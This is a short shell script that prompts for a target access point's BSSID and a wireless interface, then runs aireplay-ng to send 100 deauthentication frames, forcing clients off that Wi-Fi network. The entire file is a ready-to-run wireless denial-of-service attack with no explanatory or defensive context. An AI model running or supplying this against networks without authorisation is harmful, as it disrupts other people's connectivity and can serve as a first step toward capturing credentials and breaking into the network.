echo "Enter bssid"

read bssid

echo "interface"

read interface

aireplay-ng --deauth 100 -a $bssid --ignore-negative-one $interface
